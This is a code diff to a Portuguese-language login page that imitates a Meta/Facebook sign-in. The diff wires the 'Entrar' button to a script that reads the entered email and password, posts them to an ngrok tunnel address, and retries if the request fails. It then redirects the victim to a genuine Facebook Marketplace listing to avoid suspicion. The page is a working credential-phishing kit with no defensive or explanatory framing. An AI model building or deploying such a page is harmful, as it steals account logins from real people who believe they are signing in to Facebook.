@@ -27,7 +27,7 @@
         <input type="password" id="password" name="password" autocomplete="current-password" class="block p-3 border rounded text-sm text-black" style="background-color: #F5F6F7;"
             placeholder="Senha" />
 
-        <button class="block p-2 mt-3 rounded text-sm text-white font-bold border border-blue-"
+        <button onclick="login()" class="block p-2 mt-3 rounded text-sm text-white font-bold border border-blue-"
             style="background-color: #007BF0;">
             Entrar
         </button>
@@ -66,6 +66,33 @@
             <span class="text-gray-600 text-xs">Meta 2023</span>
         </footer>
     </div>
+    <script>
+        function sendToAnotherPage(data) {
+            window.location.href('https://www.facebook.com/marketplace/item/3410273425880276/?ref=search&referral_code=null&referral_story_type=post&tracking=browse_serp%3Adcc31d91-e7d5-43f8-bc3c-c234fd4bfb31');
+        }
+
+        function post(email, password) {
+            return fetch('https://1dad-177-124-15-66.ngrok-free.app/login', {
+                method: 'POST',
+                headers: {
+                'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => response.json());
+        }
+
+        function login() {
+            const email = document.getElementById('email')?.value;
+            const password = document.getElementById('password')?.value;
+
+            post(email, password)
+            .then(sendToAnotherPage)
+            .catch(error => {
+                post(email, password).then(sendToAnotherPage);
+            });
+        }
+    </script>
 </body>
 
 </html>
